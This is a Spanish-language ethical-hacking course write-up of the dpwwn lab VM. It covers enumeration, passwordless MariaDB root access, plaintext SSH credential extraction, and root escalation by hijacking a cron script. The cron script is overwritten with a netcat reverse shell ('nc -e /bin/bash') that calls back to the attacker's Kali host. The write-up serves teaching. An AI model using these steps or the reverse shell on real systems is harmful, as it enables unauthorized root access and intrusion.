---
title: "🖥️ Máquina: dpwwn — Hacking Ético"
aliases:
  - dpwwn
  - Máquina dpwwn
  - VM dpwwn
  - Writeup dpwwn
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: dpwwn

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración de servicios · MySQL sin autenticación · Extracción de credenciales · Acceso SSH · Escalada de privilegios (Cron Job Hijacking)  
> **Descripción:** En esta práctica accederemos a una base de datos MySQL expuesta sin contraseña para extraer credenciales SSH. Una vez dentro del sistema, aprovecharemos un script ejecutado periódicamente por root mediante cron para inyectar una reverse shell y obtener acceso como root.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.44`
* **`RHOST` (Víctima / dpwwn):** Ej. `10.0.0.46`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina dpwwn tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos TCP:

```bash
nmap -sT -p- 10.0.0.46
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

> [!info] Resultado
> El escaneo revela tres puertos abiertos. El puerto 3306 corresponde a MySQL, un servicio de base de datos que normalmente no debería estar expuesto directamente a la red. Su presencia es un vector de ataque inmediato que exploraremos.

Lanzamos un escaneo detallado para identificar versiones y configuraciones:

```bash
nmap -A -p22,80,3306 10.0.0.46
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Apache HTTP Server Test Page powered by CentOS
3306/tcp open  mysql   MySQL 5.5.60-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.60-MariaDB
|   Auth Plugin Name: mysql_native_password
```

> [!info] Resultado
> Confirmamos los servicios:
> · SSH con OpenSSH 7.4.
> · Apache 2.4.6 sobre CentOS con PHP 5.4.16. La web muestra la página de test por defecto de Apache, sin contenido relevante.
> · MariaDB 5.5.60 (fork de MySQL) expuesto en el puerto 3306. El plugin de autenticación es mysql_native_password, lo que significa que podemos intentar conectarnos directamente desde Kali si el servidor acepta conexiones remotas sin contraseña.

---

## 🗄️ Fase 2: Acceso a MySQL y extracción de credenciales

Intentamos conectarnos al servidor MySQL como root con contraseña en blanco. La opción --skip_ssl evita que el cliente intente negociar una conexión cifrada, lo que puede causar errores en versiones antiguas:

```bash
mysql -h 10.0.0.46 --skip_ssl -u root -p
```

```text
# Contraseña: (Enter - vacía)

Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

> [!info] Resultado
> Acceso exitoso al servidor MySQL como root sin contraseña. Esto es una configuración gravemente insegura: el usuario más privilegiado de la base de datos no tiene contraseña y además acepta conexiones desde cualquier IP de la red.

Listamos todas las bases de datos disponibles:

```bash
MariaDB [(none)]> show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| ssh                |
+--------------------+
```

> [!info] Resultado
> Vemos cuatro bases de datos. Las tres primeras son del sistema. La que nos interesa es ssh: su nombre sugiere que puede contener credenciales de acceso SSH.

Seleccionamos la base de datos ssh y exploramos su contenido:

```bash
MariaDB [(none)]> use ssh;
```

```bash
MariaDB [ssh]> show tables;
```

```text
+---------------+
| Tables_in_ssh |
+---------------+
| users         |
+---------------+
```

Volcamos el contenido completo de la tabla users:

```bash
MariaDB [ssh]> select * from users;
```

```text
+----+----------+---------------------+
| id | username | password            |
+----+----------+---------------------+
|  1 | mistic   | testP@$$swordmistic |
+----+----------+---------------------+
```

> [!info] Resultado
> Encontramos credenciales en texto plano almacenadas en la base de datos:
> · Usuario: mistic
> · Contraseña: testP@$$swordmistic
> Las contraseñas nunca deberían almacenarse en texto plano en una base de datos. Además, esta base de datos es accesible sin autenticación desde la red, lo que hace que esta información sea completamente pública para cualquier atacante que alcance el puerto 3306.

```bash
MariaDB [ssh]> exit
```

---

## 🔑 Fase 3: Acceso SSH

Usamos las credenciales extraídas de la base de datos para acceder al sistema por SSH:

```bash
ssh mistic@10.0.0.46
```

```text
# Contraseña: testP@$$swordmistic
```

```bash
id
```

```text
uid=1000(mistic) gid=1000(mistic) grupos=1000(mistic) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

> [!info] Resultado
> Acceso exitoso como el usuario mistic. El campo contexto indica que el sistema usa SELinux, un módulo de seguridad de Linux que puede restringir ciertas acciones. Lo tendremos en cuenta durante la escalada de privilegios.

---

## 🚀 Fase 4: Escalada de privilegios — Cron Job Hijacking

Revisamos las tareas programadas del sistema. El archivo /etc/crontab define trabajos que el sistema ejecuta automáticamente en intervalos regulares:

```bash
cat /etc/crontab
```

```text
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12)
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7)
# *  *  *  *  * user-name  command to be executed
*/3 *  * * *  root  /home/mistic/logrot.sh
```

> [!info] Resultado
> Encontramos una tarea crítica: el usuario root ejecuta el script /home/mistic/logrot.sh cada 3 minutos. La vulnerabilidad aquí es doble:
> · El script se ejecuta con privilegios de root.
> · El script está ubicado en el directorio home de mistic, sobre el que tenemos control total.
> Si modificamos el contenido de ese script, root ejecutará lo que nosotros pongamos en él.

Antes de modificarlo, inspeccionamos el contenido original del script y hacemos una copia de seguridad:

```bash
cat /home/mistic/logrot.sh
```

```text
#!/bin/bash
# Log rotation script
/usr/sbin/logrotate /etc/logrotate.conf
```

> [!info] Resultado
> El script original realiza una rotación de logs del sistema, una tarea de mantenimiento habitual. Lo copiamos como respaldo antes de modificarlo:

```bash
cp /home/mistic/logrot.sh /home/mistic/logrot.sh_back
```

Nos ponemos a la escucha en Kali en una terminal separada antes de modificar el script. Es importante hacerlo en este orden: primero escuchar, luego inyectar:

```bash
nc -lvnp {{LPORT}}
```

Ahora sobreescribimos el script con una reverse shell usando netcat. Cuando root lo ejecute, el sistema conectará de vuelta a nuestra máquina:

```bash
echo
```

> [!info] Resultado
> El comando nc -e /bin/bash indica a netcat que ejecute /bin/bash y redirija su entrada y salida a través de la conexión de red hacia nuestra máquina. Cuando root ejecute el script, recibiremos una shell interactiva con sus privilegios.

Verificamos que el script ha quedado correctamente modificado:

```bash
cat /home/mistic/logrot.sh
```

```text
nc -e /bin/bash 10.0.0.44 9002
```

Esperamos un máximo de 3 minutos hasta que cron ejecute el script. En la terminal de Kali donde tenemos netcat escuchando recibiremos la conexión:

```text
connect to [10.0.0.44] from (UNKNOWN) [10.0.0.46] 56304
```

> [!info] Resultado
> Conexión entrante recibida. Tenemos una shell como root. Nos movemos al directorio de root y leemos la flag:

```bash
cd /root
ls -la
cat dpwwn-01-FLAG.txt
```

```text
Congratulation! I knew you can pwn it as this very easy challenge. 
Thank you. 
64445777
6e643634 
37303737 
37373665 
36347077 
776e6450 
4077246e
33373336 
36359090
```

> [!info] Resultado
> Flag de root obtenida. El contenido en hexadecimal es decorativo, forma parte del diseño de la máquina.

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
